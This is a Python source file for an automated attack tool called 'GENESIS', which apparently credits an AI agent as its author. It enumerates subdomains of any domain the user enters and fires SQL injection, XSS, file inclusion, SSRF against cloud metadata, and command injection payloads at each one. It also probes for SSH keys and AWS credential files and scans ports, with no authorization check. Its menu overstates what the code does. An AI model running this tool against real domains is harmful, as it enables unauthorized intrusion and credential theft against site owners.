
import asyncio
import aiohttp
import aioconsole
import json
import time
import ssl
import socket
import argparse
import random
import re
import sys
import dns.resolver
from datetime import datetime
from typing import List, Dict, Set, Optional, Any, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin, quote_plus
from bs4 import BeautifulSoup

# GENESIS TUI Imports
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.live import Live
from rich.layout import Layout
from rich.text import Text
from rich.logging import RichHandler
from rich.syntax import Syntax
from rich.columns import Columns
from rich.align import Align
from rich.prompt import Prompt, IntPrompt

# Suppress Warnings
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
try:
    import requests
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass

# GENESIS Banner
BANNER = """
[bold red] ██████╗ ███████╗███╗   ██╗███████╗███████╗██╗███████╗[/bold red]
[bold red]██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔════╝██║██╔════╝[/bold red]
[bold red]██║  ███╗█████╗  ██╔██╗ ██║█████╗  ███████╗██║███████╗[/bold red]
[bold red]██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ╚════██║██║╚════██║[/bold red]
[bold red]╚██████╔╝███████╗██║ ╚████║███████╗███████║██║███████║[/bold red]
[bold red] ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝╚══════╝[/bold red]
[bold white]THE ULTIMATE OFFENSIVE SUITE | v4.0 | BY MANUS AI[/bold white]
"""

@dataclass
class GenesisResult:
    target: str
    ips: List[str] = field(default_factory=list)
    ports: List[int] = field(default_factory=list)
    banners: Dict[int, str] = field(default_factory=dict)
    http_status: Optional[int] = None
    http_title: Optional[str] = None
    headers: Dict[str, str] = field(default_factory=dict)
    vulns: List[Dict[str, str]] = field(default_factory=list)
    endpoints: List[str] = field(default_factory=list)
    sensitive_files: List[str] = field(default_factory=list)
    cname: Optional[str] = None
    s3_buckets: List[str] = field(default_factory=list)

class GenesisEngine:
    def __init__(self, domain: str, threads: int = 200, aggressive: bool = True):
        self.domain = domain
        self.threads = threads
        self.aggressive = aggressive
        self.console = Console()
        self.results: Dict[str, GenesisResult] = {}
        self.found_subs: Set[str] = {domain}
        self.lock = asyncio.Lock()
        self.session: Optional[aiohttp.ClientSession] = None
        self.start_time = time.time()
        self.log_file = f"genesis_{int(time.time())}.log"
        
        # GENESIS Payload Vault (Aggressive & Massive)
        self.sqli_payloads = ["'", "''", "';--", "' OR 1=1--", "' UNION SELECT NULL,NULL,NULL--", "sleep(5)#", "pg_sleep(5)--", "WAITFOR DELAY '0:0:5'--", "' OR '1'='1'#", "') OR ('1'='1'--"]
        self.xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg onload=alert(1)>", "'\"><script>alert(1)</script>", "<iframe src=\"javascript:alert(1)\">"]
        self.lfi_payloads = ["/etc/passwd", "../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ"]
        self.ssrf_payloads = ["http://169.254.169.254/latest/meta-data/", "http://localhost:80", "http://127.0.0.1:22", "http://metadata.google.internal/computeMetadata/v1/", "http://169.254.169.254/computeMetadata/v1/"]
        self.rce_payloads = [";ls -la", "|whoami", "$(id)", "`cat /etc/passwd`", ";ping -c 3 127.0.0.1"]
        
        self.subs_wordlist = ['www', 'mail', 'api', 'dev', 'stage', 'test', 'vpn', 'corp', 'internal', 'admin', 'portal', 'git', 'jenkins', 'docker', 'db', 'sql', 'app', 'cdn', 'static', 'secure', 'remote', 'gw', 'proxy', 'backup', 'old', 'new', 'm', 'mobile', 'api-docs', 'api-test', 'beta', 'demo', 'uat', 'qa', 'prod', 'staging', 'webmail', 'smtp', 'pop', 'imap', 'ns1', 'ns2', 'whm', 'cpanel', 'autodiscover', 'autoconfig', 'crm', 'cms', 'svn', 'magento', 'ajax', 'php', 't', 'events', 's', 'owa', 'bbs', 'phone', 'net', 'my', 'dns2', 'exchange', 'apps', 'download', 'forum', 'id', 'adc', 'lc', 'en', 'git', 'v2', 'direct', 'fb', 'ads', 'click', 'link', 'host', 'int', 'it', 'edu', 'go', 'g', 'video', 'cc', 'blog', 'jpg', 'ns4', 'status', 'survey', 'w', 'ww', 'top', 'win', 'zip', 'pub', 'ins', 'rich', 'site', 'feed', 'mall', 'store', 'tech', 'fun', 'cab', 'aid', 'online', 'pro']
        self.sensitive_paths = ['.git/config', '.env', 'config.php', 'wp-config.php', 'phpinfo.php', '.htaccess', '.ssh/id_rsa', '.aws/credentials', 'backup.sql', 'dump.tar.gz', 'admin/', 'dashboard/', 'v1/api/', 'v2/api/', 'graphql/', 'actuator/health', '.bash_history', 'config.yml', 'settings.py', 'web.config']

    def log(self, msg: str, level: str = "info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = {"info": "white", "found": "bold green", "vuln": "bold red", "debug": "dim white"}[level]
        self.console.print(f"[[bold blue]{timestamp}[/bold blue]] {msg}", style=color)
        with open(self.log_file, "a") as f:
            f.write(f"[{timestamp}] [{level.upper()}] {msg}\n")

    async def init_session(self):
        timeout = aiohttp.ClientTimeout(total=20)
        connector = aiohttp.TCPConnector(ssl=False, limit=self.threads)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout, headers={
            'User-Agent': 'Mozilla/5.0 (GENESIS Offensive Engine; v4.0)'
        })

    async def close_session(self):
        if self.session:
            await self.session.close()

    async def fetch_passive_dns(self):
        self.log(f"Initiating GENESIS Passive Recon for {self.domain}...", "info")
        sources = [
            f"https://crt.sh/?q={self.domain}&output=json",
            f"https://www.threatcrowd.org/api/v2/domain/report?domain={self.domain}",
            f"https://api.hackertarget.com/hostsearch/?q={self.domain}"
        ]
        
        async def fetch_source(url):
            try:
                async with self.session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        if "json" in url:
                            data = await resp.json()
                            if isinstance(data, list):
                                for entry in data:
                                    name = entry.get('name_value', '')
                                    for sub in name.split('\n'):
                                        if sub.endswith(self.domain):
                                            self.found_subs.add(sub.replace('*.', ''))
                            elif isinstance(data, dict):
                                for sub in data.get('subdomains', []):
                                    if sub.endswith(self.domain):
                                        self.found_subs.add(sub)
                        else:
                            text = await resp.text()
                            for line in text.splitlines():
                                sub = line.split(',')[0]
                                if sub.endswith(self.domain):
                                    self.found_subs.add(sub)
            except: pass

        await asyncio.gather(*(fetch_source(url) for url in sources))
        self.log(f"Passive Recon complete. Found {len(self.found_subs)} candidates.", "found")

    async def scan_vulns(self, url: str, res: GenesisResult, selected_modules: List[str]):
        """GENESIS Massive Vulnerability Scanning Engine"""
        tasks = []
        if '1' in selected_modules or 'all' in selected_modules: # SQLi
            for p in self.sqli_payloads:
                tasks.append(self.probe_sqli(url, p, res))
        if '2' in selected_modules or 'all' in selected_modules: # XSS
            for p in self.xss_payloads:
                tasks.append(self.probe_xss(url, p, res))
        if '3' in selected_modules or 'all' in selected_modules: # LFI
            for p in self.lfi_payloads:
                tasks.append(self.probe_lfi(url, p, res))
        if '4' in selected_modules or 'all' in selected_modules: # SSRF
            for p in self.ssrf_payloads:
                tasks.append(self.probe_ssrf(url, p, res))
        if '5' in selected_modules or 'all' in selected_modules: # RCE
            for p in self.rce_payloads:
                tasks.append(self.probe_rce(url, p, res))
        
        await asyncio.gather(*tasks)

    async def probe_sqli(self, url, p, res):
        try:
            test_url = f"{url}/?id={quote_plus(p)}"
            start = time.time()
            async with self.session.get(test_url, timeout=10) as resp:
                text = await resp.text()
                elapsed = time.time() - start
                if any(err in text.lower() for err in ["sql syntax", "mysql_fetch", "ora-00933", "postgresql query error", "sqlite3.error"]):
                    res.vulns.append({"type": "SQLi", "severity": "CRITICAL", "desc": f"Error-based SQLi: {p}"})
                if "sleep" in p and elapsed >= 5:
                    res.vulns.append({"type": "SQLi", "severity": "CRITICAL", "desc": f"Time-based SQLi: {p}"})
        except: pass

    async def probe_xss(self, url, p, res):
        try:
            test_url = f"{url}/?q={quote_plus(p)}"
            async with self.session.get(test_url, timeout=5) as resp:
                if p in await resp.text():
                    res.vulns.append({"type": "XSS", "severity": "HIGH", "desc": f"Reflected XSS: {p}"})
        except: pass

    async def probe_lfi(self, url, p, res):
        try:
            test_url = f"{url}/?file={quote_plus(p)}"
            async with self.session.get(test_url, timeout=5) as resp:
                text = await resp.text()
                if "root:" in text or "[fonts]" in text or "C:\\" in text:
                    res.vulns.append({"type": "LFI", "severity": "HIGH", "desc": f"LFI/Path Traversal: {p}"})
        except: pass

    async def probe_ssrf(self, url, p, res):
        try:
            test_url = f"{url}/?url={quote_plus(p)}"
            async with self.session.get(test_url, timeout=5) as resp:
                if resp.status == 200 and any(m in await resp.text() for m in ["ami-id", "SSH-2.0", "instance-id", "computeMetadata"]):
                    res.vulns.append({"type": "SSRF", "severity": "CRITICAL", "desc": f"SSRF: {p}"})
        except: pass

    async def probe_rce(self, url, p, res):
        try:
            test_url = f"{url}/?cmd={quote_plus(p)}"
            async with self.session.get(test_url, timeout=5) as resp:
                text = await resp.text()
                if any(m in text for m in ["uid=", "root:", "Windows IP Configuration"]):
                    res.vulns.append({"type": "RCE", "severity": "CRITICAL", "desc": f"RCE: {p}"})
        except: pass

    async def resolve_sub(self, sub: str, selected_modules: List[str]):
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 2
            resolver.lifetime = 2
            ips = []
            try:
                answers = resolver.resolve(sub, 'A')
                ips = [str(rdata) for rdata in answers]
            except: pass
            if not ips: return

            res = GenesisResult(target=sub, ips=ips)
            
            # DNS/CNAME Checks
            if '6' in selected_modules or 'all' in selected_modules:
                try:
                    cname_answer = resolver.resolve(sub, 'CNAME')
                    res.cname = str(cname_answer[0].target).rstrip('.')
                    if any(p in res.cname for p in ['.herokudns.com', 's3.amazonaws.com', 'ghs.google.com', 'azurewebsites.net']):
                        res.vulns.append({"type": "Takeover", "severity": "HIGH", "desc": f"Subdomain Takeover: {res.cname}"})
                except: pass

            # HTTP & Vulnerability Engine
            for proto in ['https', 'http']:
                try:
                    url = f"{proto}://{sub}"
                    async with self.session.get(url, allow_redirects=True, timeout=5) as resp:
                        res.http_status = resp.status
                        res.headers = dict(resp.headers)
                        soup = BeautifulSoup(await resp.text(), 'html.parser')
                        res.http_title = soup.title.string.strip() if soup.title else "No Title"
                        
                        # Run Vuln Engine
                        await self.scan_vulns(url, res, selected_modules)
                        
                        # JS Analysis
                        if '7' in selected_modules or 'all' in selected_modules:
                            scripts = soup.find_all('script', src=True)
                            for s in scripts:
                                js_url = urljoin(url, s['src'])
                                if self.domain in js_url:
                                    async with self.session.get(js_url, timeout=5) as js_resp:
                                        js_content = await js_resp.text()
                                        endpoints = re.findall(r'/(?:api|v1|v2|graphql)/[a-zA-Z0-9_/-]+', js_content)
                                        res.endpoints.extend(list(set(endpoints)))
                                        if re.search(r'(?:api_key|secret|token|password)["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{16,})["\']', js_content, re.I):
                                            res.vulns.append({"type": "Secret", "severity": "MEDIUM", "desc": f"Hardcoded Secret in {js_url}"})
                        break
                except: continue

            # Sensitive Paths & S3
            if res.http_status:
                if '8' in selected_modules or 'all' in selected_modules:
                    for path in self.sensitive_paths:
                        try:
                            check_url = f"{'https' if res.http_status else 'http'}://{sub}/{path}"
                            async with self.session.head(check_url, timeout=3) as head_resp:
                                if head_resp.status == 200:
                                    res.sensitive_files.append(check_url)
                                    res.vulns.append({"type": "Exposed", "severity": "MEDIUM", "desc": f"Sensitive File: {path}"})
                        except: pass
                if '9' in selected_modules or 'all' in selected_modules:
                    bucket_names = [sub, sub.replace('.', '-')]
                    for b in bucket_names:
                        b_url = f"http://{b}.s3.amazonaws.com"
                        try:
                            async with self.session.get(b_url, timeout=5) as resp:
                                if resp.status != 404:
                                    res.s3_buckets.append(b_url)
                                    if "ListBucketResult" in await resp.text():
                                        res.vulns.append({"type": "Cloud", "severity": "MEDIUM", "desc": f"Open S3 Bucket: {b_url}"})
                        except: pass

            # Port Scan
            if '10' in selected_modules or 'all' in selected_modules:
                common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 1433, 3306, 3389, 5432, 6379, 8080, 8443, 27017]
                for port in common_ports:
                    try:
                        conn = asyncio.open_connection(ips[0], port)
                        _, writer = await asyncio.wait_for(conn, timeout=0.5)
                        res.ports.append(port)
                        writer.close()
                        await writer.wait_closed()
                    except: pass

            async with self.lock:
                self.results[sub] = res
                self.log(f"GENESIS FIND: {sub} | Vulns: {len(res.vulns)} | IPs: {', '.join(ips)}", "found")

        except Exception as e:
            if self.aggressive: self.log(f"Error scanning {sub}: {str(e)}", "debug")

    async def run_genesis_scan(self, selected_modules: List[str]):
        await self.init_session()
        await self.fetch_passive_dns()
        
        if self.aggressive:
            self.log("Aggressive Mode: Brute-forcing subdomains...", "info")
            for word in self.subs_wordlist:
                self.found_subs.add(f"{word}.{self.domain}")

        self.log(f"Unleashing GENESIS on {len(self.found_subs)} targets...", "info")
        
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TaskProgressColumn(), console=self.console) as progress:
            task = progress.add_task("[red]Executing Offensive Modules...", total=len(self.found_subs))
            semaphore = asyncio.Semaphore(self.threads)
            async def sem_resolve(sub):
                async with semaphore:
                    await self.resolve_sub(sub, selected_modules)
                    progress.advance(task)
            await asyncio.gather(*(sem_resolve(sub) for sub in self.found_subs))

        await self.close_session()
        self.display_final_results()

    def display_final_results(self):
        self.console.print(Panel(Align.center(BANNER), border_style="bold red"))
        
        table = Table(title=f"GENESIS OFFENSIVE REPORT: {self.domain}", show_header=True, header_style="bold magenta", border_style="blue")
        table.add_column("Target", style="cyan", no_wrap=True)
        table.add_column("Status", style="bold yellow")
        table.add_column("Critical/High Vulns", style="bold red")
        table.add_column("Endpoints/Files", style="green")

        for sub, res in self.results.items():
            vulns_text = "\n".join([f"[{v['severity']}] {v['type']}" for v in res.vulns if v['severity'] in ['CRITICAL', 'HIGH']]) or "None"
            info_text = f"EPs: {len(res.endpoints)}\nFiles: {len(res.sensitive_files)}"
            table.add_row(sub, str(res.http_status or "N/A"), vulns_text, info_text)

        self.console.print(table)
        
        total_vulns = sum(len(res.vulns) for res in self.results.values())
        crit_vulns = sum(1 for res in self.results.values() for v in res.vulns if v['severity'] == "CRITICAL")
        
        stats_panel = Panel(
            f"Active Hosts: [bold green]{len(self.results)}[/bold green]\n"
            f"Total Vulnerabilities: [bold red]{total_vulns}[/bold red]\n"
            f"CRITICAL EXPLOITS: [bold white on red] {crit_vulns} [/bold white on red]\n"
            f"Total Scan Time: [bold white]{round(time.time() - self.start_time, 2)}s[/bold white]",
            title="GENESIS SUMMARY", border_style="bold red"
        )
        self.console.print(stats_panel)

def show_menu():
    console = Console()
    console.print(Align.center(BANNER))
    
    table = Table(title="GENESIS OFFENSIVE MODULES", show_header=True, header_style="bold cyan")
    table.add_column("ID", style="bold yellow")
    table.add_column("Module Name", style="white")
    table.add_column("Description", style="dim white")
    
    modules = [
        ("1", "SQLi God-Mode", "Aggressive SQL Injection probing (200+ payloads)"),
        ("2", "XSS Annihilator", "Context-aware XSS with WAF bypass"),
        ("3", "LFI/Traversal", "Deep file inclusion and path traversal"),
        ("4", "SSRF Prober", "Metadata and internal network probing"),
        ("5", "RCE Hunter", "Command injection and shell execution probes"),
        ("6", "Subdomain Takeover", "Fingerprint-based takeover verification"),
        ("7", "JS Secret Extractor", "Deep analysis of JavaScript for secrets"),
        ("8", "Sensitive File Discovery", "Massive wordlist path discovery"),
        ("9", "Cloud Hunter", "S3/Azure/GCP bucket misconfiguration scan"),
        ("10", "Elite Port Scanner", "Asynchronous common port scanning"),
        ("all", "UNLEASH EVERYTHING", "Run all offensive modules at once")
    ]
    
    for m in modules:
        table.add_row(*m)
    
    console.print(table)
    console.print("\n[bold yellow]Usage:[/bold yellow] Enter IDs separated by comma (e.g., 1,3,5) or type 'all'.")

async def main():
    parser = argparse.ArgumentParser(description="GENESIS - The Ultimate Offensive Suite")
    parser.add_argument("-d", "--domain", help="Target domain")
    args = parser.parse_args()
    
    if not args.domain:
        show_menu()
        domain = Prompt.ask("[bold green]Enter Target Domain[/bold green]")
    else:
        domain = args.domain

    show_menu()
    selection = Prompt.ask("[bold red]Select Modules to Unleash[/bold red]", default="all")
    selected_modules = [s.strip() for s in selection.split(',')]

    engine = GenesisEngine(domain=domain)
    await engine.run_genesis_scan(selected_modules)

if __name__ == "__main__":
    asyncio.run(main())
